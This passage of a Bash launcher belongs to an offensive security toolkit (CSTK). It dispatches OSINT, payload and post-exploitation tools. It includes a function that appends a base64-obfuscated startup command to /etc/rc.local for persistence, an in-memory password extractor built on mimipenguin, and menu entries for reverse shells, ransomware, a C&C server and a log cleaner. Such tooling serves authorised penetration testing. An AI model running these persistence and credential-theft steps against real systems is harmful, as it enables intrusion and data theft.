    if [[ -z "$pass" || "$pass" =~ ^[Yy]$ ]]; then
        "$cstk_wrapper" "$file" --level 2 --sudo_password -a
    else
        "$cstk_wrapper" "$file" --level 2 -a
    fi
    wait_and_return
}

# Class: POST EXPLOIT - Tool: Kernel Exploit - Option 5 (Wrapper Used)
linux_exploits_check() {
    engagement_dispatch_guard linux_exploits_check || { wait_and_return; return 1; }
    local file
    file="$bin/PostEx_linux_exploit_checker"
    clear
    postx_kernal_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$file"
    wait_and_return

}

# Class: POST EXPLOIT - Tool: Command on start up - Option 6
startup_command() {
    engagement_dispatch_guard startup_command || { wait_and_return; return 1; }
    clear
    postx_onstart_frame
    sleep 5
    local LOOT_FILE="$Loot/embed_command_on_start.txt"
    exec > >(tee -a "$LOOT_FILE") 2>&1
    echo -e "${G} \nEnter command to run at startup ${X}"
    read -r -p "CSTK ==>  " command
    local encoded decoder
    encoded=$(printf '%s' "$command" | base64 | tr -d '\n')
    decoder="printf '%s' '$encoded' | base64 -d | bash"
    echo "$decoder" >>/etc/rc.local
    echo -e "${P} \nAppended encoded command to ${R} /etc/rc.local ${X}"
    wait_and_return
}

# Class: POST EXPLOIT - Tool: Brute force archive - Option 7 (Wrapper Used)
brute_force_file() {
    engagement_dispatch_guard brute_force_file || { wait_and_return; return 1; }
	local file
	file="$bin/PostEx_bruteforce_archive"
    clear
    postx_bruteforce_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$file"
    wait_and_return
}

# Class: POST EXPLOIT - Tool: Files of interest - Option 8 (Wrapper Used)
files_of_interest() {
    engagement_dispatch_guard files_of_interest || { wait_and_return; return 1; }
	local file
	file="$bin/PostEx_filesofinterest"
    clear
    postx_foi_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$file"
    wait_and_return
}

# Class: POST EXPLOIT - Tool: Rootkits Option 9 (WRAPPER USED)
# REMOVED

# Class: POST EXPLOIT - Tool: In-Memory Password Audit - Option 10
inmem_password_stealer() {
    engagement_dispatch_guard inmem_password_stealer || { wait_and_return; return 1; }
    local dir file runner answer save_output output_file rc process supported_found
    dir="$home_dir/Other/Downloads/mimipenguin/"
    file="$dir/mimipenguin"
    clear
    postx_inmem_frame
    echo -e "${Y}This legacy, best-effort audit reads live process memory as root.${X}"
    echo "It supports only selected GDM, GNOME Keyring, LightDM, SSHD, VSFTPD, and Apache processes."
    echo "No output can simply mean that no supported process retained a recoverable plaintext password."
    echo

    if [[ -x /usr/local/bin/mimipenguin.py ]]; then
        runner=(python3 /usr/local/bin/mimipenguin.py)
    elif [[ -x /usr/local/bin/mimipenguin.sh ]]; then
        runner=(bash /usr/local/bin/mimipenguin.sh)
    elif [[ -f "$file.py" ]]; then
        runner=(python3 "$file.py")
    elif [[ -f "$file.sh" ]]; then
        runner=(bash "$file.sh")
    else
        echo -e "${R}[ ERROR ] MimiPenguin is not installed and no source copy was found.${X}"
        echo "Run the CSTK installer to repair the installation."
        return 3
    fi

    supported_found="no"
    for process in gdm-password gnome-keyring-daemon lightdm sshd vsftpd apache2; do
        if pgrep -f -- "$process" >/dev/null 2>&1; then
            echo -e "${G}[ FOUND ] Supported live process: $process${X}"
            supported_found="yes"
        fi
    done
    if [[ "$supported_found" != "yes" ]]; then
        echo -e "${Y}[ INFO ] No supported live process was detected; no password recovery is expected.${X}"
        wait_and_return
        return 0
    fi

    read -r -p "Run the intrusive live-memory audit now? [y/N]: " answer
    [[ "$answer" =~ ^[Yy]$ ]] || { wait_and_return; return 0; }

    save_output="no"
    read -r -p "Save unredacted output in your private Loot directory? [y/N]: " answer
    if [[ "$answer" =~ ^[Yy]$ ]]; then
        save_output="yes"
        output_file="$Loot/in-memory-password-audit-$(date +%Y%m%d-%H%M%S).txt"
        run_as_cstk_user touch -- "$output_file" || return 1
        run_as_cstk_user chmod 600 -- "$output_file" || return 1
        echo -e "${Y}[ WARNING ] The saved file may contain plaintext credentials.${X}"
        sudo "${runner[@]}" 2>&1 | tee -- "$output_file"
        rc=${PIPESTATUS[0]}
        chown -- "$user:$user_group" "$output_file" || return 1
        chmod 600 -- "$output_file" || return 1
        echo "Result saved to $output_file"
    else
        sudo "${runner[@]}"
        rc=$?
    fi

    if [[ "$rc" -ne 0 ]]; then
        echo -e "${R}[ ERROR ] The memory audit exited with status $rc.${X}"
    else
        echo -e "${Y}[ INFO ] If no credential line appeared, no supported recoverable password was found.${X}"
    fi
    if [[ "$save_output" == "yes" && ! -s "$output_file" ]]; then
        echo -e "${Y}[ INFO ] The saved result is empty.${X}"
    fi
    wait_and_return
    return "$rc"
}

# ##### ETC #####
# Class: ETC - Tool: Users and Shells - Option 1 (AWK)
users_and_shells() {
    engagement_dispatch_guard users_and_shells || { wait_and_return; return 1; }
    clear
    etc_usershells_frame
    sleep 5
    local LOOT_FILE
    LOOT_FILE="$Loot/users_and_shells.txt"
    /usr/bin/awk -F: '
    BEGIN {
        printf("\n\n%s\n", "/etc/passwd accounts with login shells");
        printf("%s\n", "------------------------------------------");
    }
    {
        if ($7 ~ /sh/) { printf("%10s uses the shell %s\n", $1, $7); }
    }
    ' /etc/passwd | tee -a "$LOOT_FILE"
    echo "Users and shells saved in $LOOT_FILE"
    wait_and_return
}

# Class: ETC - Tool: Python Web server - Option 2 (Wrapper Used)
py_web_server() {
    engagement_dispatch_guard py_web_server || { wait_and_return; return 1; }
	local file
	file="$bin/Etc_py_web_server"
    clear
    etc_webserver_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$file"
    wait_and_return
}

# Class: ETC - Tool: File Extractor - Option 3 (Wrapper Used)
extract_arch() {
    engagement_dispatch_guard extract_arch || { wait_and_return; return 1; }
	local file
	file="$bin/Etc_extract_archive"
    clear
    etc_extract_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$file"
    wait_and_return
}

# Class: ETC - Tool: openssl helper - Option 4 (Wrapper Used)
r_b_g_wrapper() {
    engagement_dispatch_guard r_b_g_wrapper || { wait_and_return; return 1; }
	local file
	file="$bin/Etc_openssl_helper"
    clear
    etc_openssl_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$file"
    wait_and_return
}

# Class: ETC - Tool: Gpg Look a like - Option 5 (Wrapper Used)
gpg_lookalike_wrapper() {
    engagement_dispatch_guard gpg_lookalike_wrapper || { wait_and_return; return 1; }
	local file
	file="$bin/Etc_gpg_enc_dec"
    clear
    etc_secret_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$file"
    wait_and_return
}

# Class: ETC - Tool: Create exe Binary - Option 6 (Wrapper Used)
create_exe_binary() {
    engagement_dispatch_guard create_exe_binary || { wait_and_return; return 1; }
	local file
	file="$bin/Etc_make_binary"
    clear
    etc_binary_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$file"
    wait_and_return
}

# Class: ETC - Tool: Post exploit tools to go - Option 7
post_x_2_go() {
    engagement_dispatch_guard post_x_2_go || { wait_and_return; return 1; }
	local file
	file="$lib/CSTK_Zip2Go.zip"
    [[ -t 1 ]] && clear
    etc_postx_frame
    if [[ ! -f "$file" ]]; then
        echo -e "${R}Missing required archive: $file${X}"
        wait_and_return
        return
    fi
    if ! cp -- "$file" "$Malware/"; then
        echo -e "${R}Unable to copy CSTK_Zip2Go.zip to $Malware.${X}"
        wait_and_return
        return
    fi
    echo "CSTK_Zip2Go.zip (portable assessment edition) is located in the $Malware folder"
    echo "Extract the complete CSTK_2Go directory and read its README before running run_me.sh."
    wait_and_return
}

# Class: ETC - Tool: Array Encrypted Script - Option 8 (Wrapper Used)
array_enc_script() {
    engagement_dispatch_guard array_enc_script || { wait_and_return; return 1; }
	local file
	file="$bin/Etc_array_enc"
    clear
    etc_array_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$file"
    wait_and_return
}

# Class: ETC - Tool: Log Cleaner - Option 9 (Wrapper Used)
log_cleaning_tool() {
    engagement_dispatch_guard log_cleaning_tool || { wait_and_return; return 1; }
	local file
	file="$bin/Etc_log_cleaner"
    clear
    etc_logclean_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$file"
    wait_and_return
}
# Class: ETC - Tool: Arsenal - Option A
arsenal() {
    engagement_dispatch_guard arsenal || { wait_and_return; return 1; }
    local file
    file="$(command -v arsenal-ng || true)"
    if [[ -z "$file" || ! -x "$file" ]]; then
        echo -e "${R}arsenal-ng is not installed or is not executable.${X}" >&2
        echo -e "${Y}Install the arsenal-ng package, then try again.${X}" >&2
        wait_and_return
        return 1
    fi
    clear
    etc_arsenal_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$file"
    wait_and_return
}

# Class: ETC - Tool: Hash Identify - Option B (Wrapper Used)
hash_id() {
    engagement_dispatch_guard hash_id || { wait_and_return; return 1; }
    local file
    file="$bin/Etc_hash_idenify"
    clear
    etc_hashid_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$file"
    wait_and_return
}

# Class: ETC - Tool: CSTK AI Analyst - Option C
cstk_ai_analyst() {
    engagement_dispatch_guard cstk_ai_analyst || { wait_and_return; return 1; }
    local file
    file="$bin/Etc_cstk_ai"
    if [[ ! -f "$file" || ! -x "$file" || -L "$file" ]]; then
        echo -e "${R}CSTK AI Analyst is missing or is not a safe executable.${X}" >&2
        wait_and_return
        return 1
    fi
    clear
    etc_ai_frame
    # The analyst needs no privileged operation. Run it directly as the
    # invoking user so model traffic and private session state never run as root.
    stop_engagement_hud
    tput csr 0 "$(( $(tput lines 2>/dev/null || echo 24) - 1 ))" 2>/dev/null || true
    run_as_cstk_user "$file"
    start_engagement_hud
    wait_and_return
}

run_control_client() {
    if [[ "$#" == 1 && "$1" == engagements ]]; then
        run_engagement_helper list --format table
    else
        echo "Use the integrated engagement manager (G) for guarded operations." >&2
        return 1
    fi
}

# ##### DEFENSE: run read-only tools as the invoking user #####
web_tls_assessment() {
    engagement_dispatch_guard web_tls_assessment || return 1
    defense_web_tls_frame
    run_as_cstk_user "$bin/web_tls_security_assessment" "$@"
}

linux_security_assessment() {
    defense_linux_audit_frame
    if [[ ! -x "$bin/linux_security_audit" ]]; then
        echo "[SKIP] Linux Security Audit executable is unavailable in this checkout."
        return 3
    fi
    engagement_dispatch_guard linux_security_assessment || return 1
    run_as_cstk_user "$bin/linux_security_audit" "$@"
}

defense_menu() {
    local choice target
    while true; do
        printf '\nDEFENSE\n1 - Linux Security Audit\n2 - Web/TLS Security Assessment\nX - Return\n'
        read -r -p "Defense ==> " choice || return 0
        case "$choice" in
            1) linux_security_assessment ;;
            2) read -r -p "Explicit HTTP/HTTPS target URL: " target || return 0
               [[ -n "$target" ]] && web_tls_assessment "$target" ;;
            [Xx]) return 0 ;;
            *) echo "Choose 1, 2, or X." ;;
        esac
    done
}

######################### MAIN SCRIPT #######################
if [[ $# -eq 1 ]]; then
    case "$1" in
    -h | -H)
        grep '^#//S' <"${BASH_SOURCE[0]}" | cut -c 5-
        exit
        ;;
    --help)
        grep '^#/' <"${BASH_SOURCE[0]}" | cut -c 5-
        exit
        ;;
    -v | -V)
        grep '^#//V' <"${BASH_SOURCE[0]}" | cut -c 5-
        exit
        ;;
    --version)
        grep '^#//W' <"${BASH_SOURCE[0]}" | cut -c 5-
        exit
        ;;
    esac
fi

if [[ $# -eq 1 && "$1" == "--refresh-hashes" ]]; then
    refresh_integrity_after_update
    exit $?
fi

check_hash || exit 1
prepare_user_data_dirs || exit 1
run_as_cstk_user mkdir -p -- "$CSTK_ENGAGEMENTS_DIR" || exit 1
trap finish_cstk_session EXIT

if [[ "$1" == "--use" ]]; then
    [[ $# -ge 2 ]] || { echo "--use requires an engagement ID" >&2; exit 2; }
    apply_engagement_selection "$2" || exit 1
    shift 2
fi
if [[ $# -eq 1 && "$1" =~ ^(-G|--engagements)$ ]]; then
    engagement_manager_menu
    exit $?
fi
if [[ $# -eq 0 ]]; then
    [[ -t 0 && -t 1 ]] || { echo "The CSTK menu requires an interactive terminal." >&2; exit 2; }
    check_if_password_is_needed
fi
if [[ $# -eq 1 && "$1" =~ ^(-T|--tty)$ ]]; then
    show_tty_upgrade_guide
    exit $?
fi
if [[ $# -eq 1 && "$1" =~ ^(-C|--check-updates)$ ]]; then
    run_update_manager check
    exit $?
fi
if [[ $# -eq 1 && "$1" =~ ^(-U|--update)$ ]]; then
    run_update_manager update
    exit $?
fi
if [[ $# -eq 1 && "$1" == --private-data ]]; then
    private_data_menu
    exit $?
fi
if [[ $# -ge 2 && "$1" == "--control" ]]; then
    shift
    run_control_client "$@"
    exit $?
fi
# DEFENSE accepts a target argument; keep legacy class dispatch below unchanged.
if [[ ${1:-} == -D || ${1:-} == --defense || ${1:-} == -D* ]]; then
    defense_option=$1
    shift
    case "$defense_option" in
        -D|--defense)
            if [[ $# == 0 ]]; then
                if [[ -t 0 ]]; then defense_menu; else grep '^#//D' <"${BASH_SOURCE[0]}" | cut -c 5-; fi
                exit $?
            fi
            defense_tool=$1; shift ;;
        -Dl) defense_tool=--linux-audit ;;
        -Dw) defense_tool=--web-tls ;;
        *) echo "Invalid DEFENSE option." >&2; exit 2 ;;
    esac
    case "$defense_tool" in
        l|-l|--linux-audit)
            [[ $# == 0 ]] || { echo "Linux audit takes no launcher arguments." >&2; exit 2; }
            linux_security_assessment; exit $? ;;
        w|-w|--web-tls)
            [[ $# == 1 ]] || { echo "Usage: cstk -Dw HTTP_OR_HTTPS_URL" >&2; exit 2; }
            web_tls_assessment "$1"; exit $? ;;
        *) echo "Unknown DEFENSE tool." >&2; exit 2 ;;
    esac
fi
if [[ $# -eq 1 && "$1" =~ ^-[OPXE].* ]]; then
    opt="-${1:1:1}"
    if [[ ${#1} -gt 2 ]]; then
        tool="-${1:2}" # "-p" from "-Op"
    else
        tool=""
        case $opt in
            -O) grep '^#//O' <"${BASH_SOURCE[0]}" | cut -c 5- ;;
            -P) grep '^#//P' <"${BASH_SOURCE[0]}" | cut -c 5- ;;
            -X) grep '^#//X' <"${BASH_SOURCE[0]}" | cut -c 5- ;;
            -E) grep '^#//E' <"${BASH_SOURCE[0]}" | cut -c 5- ;;
            *) grep '^#/' <"${BASH_SOURCE[0]}" | cut -c 5- ;;
        esac
        exit
    fi
elif [[ "$1" =~ ^--(osint|payload|postx|etc)$ ]]; then
    if [[ $# -eq 1 ]]; then
        case $1 in
        --osint)
            grep '^#//O' <"${BASH_SOURCE[0]}" | cut -c 5-
            exit
            ;;
        --payload)
            grep '^#//P' <"${BASH_SOURCE[0]}" | cut -c 5-
            exit
            ;;
        --postx)
            grep '^#//X' <"${BASH_SOURCE[0]}" | cut -c 5-
            exit
            ;;
        --etc)
            grep '^#//E' <"${BASH_SOURCE[0]}" | cut -c 5-
            exit
            ;;
        *)
            grep '^#/' <"${BASH_SOURCE[0]}" | cut -c 5-
            exit
            ;;
        esac
    elif [[ $# -ne 2 ]]; then
        grep '^#/' <"${BASH_SOURCE[0]}" | cut -c 5-
        exit 2
    fi
    opt="$1"
    tool="$2"
else
    grep '^#/' <"${BASH_SOURCE[0]}" | cut -c 5-
    exit
fi
case $opt in
    -O) class="osint1" ;;
    -P) class="payload1" ;;
    -X) class="postx1" ;;
    -E) class="etc1" ;;
    --osint) class="osint2" ;;
    --payload) class="payload2" ;;
    --postx) class="postx2" ;;
    --etc) class="etc2" ;;
    *) grep '^#/' <"${BASH_SOURCE[0]}" | cut -c 5- && exit ;;
esac
case $class in
    osint1)
        case $tool in
        -f) find_that_ip ;;
        -s) sweep_ip ;;
        -n) nmap_tool ;;
        -e) enum_tool ;;
        -b) breach_parse_wrapper ;;
        -g) google_dorks ;;
        -m) email_search ;;
        -p) pass_attack ;;
        -v) vuln_searcher ;;
        -u) username_gen ;;
        -h) ssh_enum ;;
        -w) waf_detect ;;
        *) grep '^#//O' <"${BASH_SOURCE[0]}" | cut -c 5- && exit ;;
        esac
        ;;
    osint2)
        case $tool in
        --findip) find_that_ip ;;
        --sweep) sweep_ip ;;
        --nmap) nmap_tool ;;
        --enum) enum_tool ;;
        --breached) breach_parse_wrapper ;;
        --google) google_dorks ;;
        --email) email_search ;;
        --pass) pass_attack ;;
        --vuln) vuln_searcher ;;
        --username) username_gen ;;
        --ssh) ssh_enum ;;
        --waf) waf_detect ;;
        *) grep '^#//O' <"${BASH_SOURCE[0]}" | cut -c 5- && exit ;;
        esac
        ;;
    payload1)
        case $tool in
        -n) netcat_choice ;;
        -v) rev_shells ;;
        -r) ransomware_shell_options ;;
        -p) rev_shells_all ;;
        -t) no_touch_script ;;
        -b) dos_bomb_attack ;;
        -s) ssh_attack ;;
        -m) msf_payloads ;;
        -a) apk_killer ;;
        -c) cnc_server ;;
        *) grep '^#//P' <"${BASH_SOURCE[0]}" | cut -c 5- && exit 2 ;;
        esac
        ;;
    payload2)
        case $tool in
        --netcat) netcat_choice ;;
        --revshell) rev_shells ;;
        --ransom) ransomware_shell_options ;;
        --revall) rev_shells_all ;;
        --notouch) no_touch_script ;;
        --bomb) dos_bomb_attack ;;
        --ssh) ssh_attack ;;
        --msf) msf_payloads ;;
        --apk) apk_killer ;;
        --cnc) cnc_server ;;
        *) grep '^#//P' <"${BASH_SOURCE[0]}" | cut -c 5- && exit ;;
        esac
        ;;
    postx1)
        case $tool in
        -v) check_the_vm ;;
        -b) browser_data_wrapper ;;
        -c) crypto_catch ;;
        -g) check_gtfob ;;
        -k) linux_exploits_check ;;
        -s) startup_command ;;
        -f) brute_force_file ;;
        -i) files_of_interest ;;
        -e) inmem_password_stealer ;;
        *) grep '^#//X' <"${BASH_SOURCE[0]}" | cut -c 5- && exit ;;
        esac
        ;;
    postx2)
        case $tool in
        --vm) check_the_vm ;;
        --browser) browser_data_wrapper ;;
        --crypto) crypto_catch ;;
        --gtfo) check_gtfob ;;
        --kernel) linux_exploits_check ;;
        --onstart) startup_command ;;
        --force) brute_force_file ;;
        --foi) files_of_interest ;;
        --inmemory) inmem_password_stealer ;;
        *) grep '^#//X' <"${BASH_SOURCE[0]}" | cut -c 5- && exit ;;
        esac
        ;;
    etc1)
        case $tool in
        -u) users_and_shells ;;
        -w) py_web_server ;;
        -x) extract_arch ;;
        -o) r_b_g_wrapper ;;
        -l) gpg_lookalike_wrapper ;;
        -e) create_exe_binary ;;
        -a) array_enc_script ;;
        -c) log_cleaning_tool ;;
        -h) hash_id ;;
        -z) post_x_2_go ;;
        -g) arsenal ;;
        -i) cstk_ai_analyst ;;
        *) grep '^#//E' <"${BASH_SOURCE[0]}" | cut -c 5- && exit ;;
        esac
        ;;
    etc2)
        case $tool in
        --users) users_and_shells ;;
        --webserver) py_web_server ;;
        --extract) extract_arch ;;
        --openssl) r_b_g_wrapper ;;
        --lookalike) gpg_lookalike_wrapper ;;
        --exe) create_exe_binary ;;
        --array) array_enc_script ;;
        --clean) log_cleaning_tool ;;
        --hashid) hash_id ;;
        --zip) post_x_2_go ;;
        --ng) arsenal ;;
        --ai) cstk_ai_analyst ;;
        *) grep '^#//E' <"${BASH_SOURCE[0]}" | cut -c 5- && exit ;;
        esac
        ;;
    *)
        grep '^#/' <"${BASH_SOURCE[0]}" | cut -c 5-
        exit
        ;;
esac
